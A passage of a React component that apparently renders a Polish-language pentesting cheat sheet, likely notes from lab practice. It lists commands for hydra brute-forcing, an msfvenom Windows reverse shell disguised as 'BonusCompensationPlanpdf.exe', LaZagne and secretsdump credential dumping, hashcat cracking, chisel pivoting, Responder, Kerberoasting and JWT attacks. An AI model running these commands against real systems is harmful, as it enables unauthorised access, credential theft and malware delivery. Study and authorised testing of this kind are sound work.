                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt ssh://{'<IP>'}</td>
                            <td>Brute ssh</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt ssh://{'<IP>'}</td>
                            <td>Brute ssh</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt smtp://{'<mail.server.com>'}</td>
                            <td>Brute smtp</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt pop3://{'<mail.server.com>'}</td>
                            <td>Brute pop3</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt imap://{'<mail.server.com>'}</td>
                            <td>Brute imap</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt mysql://{'<IP>'}</td>
                            <td>Brute mysql</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt mssql://{'<IP>'}</td>
                            <td>Brute mssql</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt vnc://{'<IP>'}</td>
                            <td>Brute vnc</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt ssh://{'<IP>'} http-get</td>
                            <td>Brute-Forcing HTTP Authentication</td>
                        </tr>
                        <tr>
                            <td>hydra -l {'<USER>'} -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"</td>
                            <td>Brute-Forcing Form POST</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>msfvenom</summary>
                <Link to='https://www.revshells.com'>Reverse shell generator</Link>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe {`>`} BonusCompensationPlanpdf.exe</td>
                            <td>Reverse shell w .exe</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>Lazagne</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>start lazagne.exe all</td>
                            <td>Szuka haseł dostępnych w Windows</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>secretsdump</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>python3 ./secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</td>
                            <td>Wyciąganie credential z plików sam, security, system</td>
                        </tr>
                        <tr>
                            <td>python3 ./secretsdump.py -sam sam.save -system system.save LOCAL</td>
                            <td>Wyciąganie credential z plików sam, system</td>
                        </tr>
                        <tr>
                            <td>python3 ./secretsdump.py {'<Domena>'}/{'<User name>'}:{'<Password>'}@{'<IP>'} -just-dc-ntlm</td>
                            <td>Wyciąganie credential z NTLM</td>
                        </tr>
           
                    </tbody>
                </table>
            </details>

            <details>
                <summary>Hashcat</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked</td>
                            <td>Odhashowanie unshadow file</td>
                        </tr>
                        <tr>
                            <td>hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</td>
                            <td>Odhashowanie SAM hash file</td>
                        </tr>
                        <tr>
                            <td>hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked</td>
                            <td>Odhashowanie bitlocker hash file</td>
                        </tr>
                        <tr>
                            <td>hashcat -m 13100 kerberos.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt</td>
                            <td>Odhashowanie kerberos hash file</td>
                        </tr>
                        <tr>
                            <td>hashcat -m 16500 jwt.txt /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt</td>
                            <td>Odhashowanie jwt hash file</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>SSH</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>ssh -L 1234:localhost:3306 {'<USER>'}@{'<IP>'}</td>
                            <td>Przekierowanie closed (3306) portu na nasz (1234) </td>
                        </tr>
                        <tr>
                            <td>ssh -D 9050 {'<USER>'}@{'<IP>'}</td>
                            <td>Dynamiczne przekierowanie na port 9050 - ustawić proxychain </td>
                        </tr>
                    </tbody>
                </table>
            </details>
            
            <details>
                <summary>Chisel</summary>
                <p>PAMIĘTAĆ USTAWIĆ PROXYCHAIN</p>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>./chisel server -v -p 1234 --socks5</td>
                            <td>Włączenie chisela po stornie atakowanego servera</td>
                        </tr>
                        <tr>
                            <td>./chisel client -v 10.129.202.64:1234 socks</td>
                            <td>Włączenie chisela po stronie naszego hosta </td>
                        </tr>
                        <tr>
                            <td>Reverse chisel</td>
                            <td> </td>
                        </tr>
                        <tr>
                            <td>./chisel client -v 10.10.14.17:1234 R:socks</td>
                            <td>Włączenie chisela po stornie atakowanego servera</td>
                        </tr>
                        <tr>
                            <td>./chisel server --reverse -v -p 1234 --socks5</td>
                            <td>Włączenie chisela po naszej stronie</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>Responder</summary>
             
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>responder -I {'<Nazwa interface>'}</td>
                            <td>Nasłuchiwanie połączeń</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>GetUserSPNs.py</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>GetUserSPNs.py {'<Domena>'}/{'<User>'}:{'<Password>'} -dc-ip {'<IP>'} -request</td>
                            <td>Wyszukiwanie oraz zwrot userów z Kerberos</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>secretsdump.py</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>secretsdump.py {'<Domena>'}/{'<User>'}:{'<Password>'}@{'<IP>'}</td>
                            <td>Zwraca userów oraz hashe SAM w domenie</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>bloodhound</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>bloodhound</td>
                            <td>Otwiera aplikację</td>
                        </tr>
                        <tr>
                            <td>bloodhound-python -d {'<Domena>'} -u {'<User>'} -p {'<Password>'} -ns {'<IP>'} -c all </td>
                            <td>Zebranie wszystkich danych z domeny</td>
                        </tr>
                    </tbody>
                </table>
            </details>

            <details>
                <summary>JWT tool</summary>
                <table>
                    <thead>
                        <tr>
                        <th>Komenda</th>
                        <th>Opis</th>
                        </tr>
                    </thead>
                    <tbody className='description'>
                        <tr>
                            <td>jwt_tool.py {`<Token>`}</td>
                            <td>Wyciągnij dane JWT</td>
                        </tr>
                        <tr>
                            <td>jwt_tool.py {`<Token>`} -T</td>
                            <td>Przerobienie danych w JWT</td>
                        </tr>
                        <tr>
                            <td>jwt_tool.py -t {`<Url>`} -rh {`<Token>`} -M at</td>
                            <td>Wszystkie exploit testy JWT</td>
                        </tr>
                        <tr>
                            <td>jwt_tool.py {`<Token>`} --crack -d {`<Wordlist>`}</td>
                            <td>Crack sygnatury</td>
                        </tr>
                    </tbody>
                </table>
            </details>

        </section>
    )
};

export default Commends;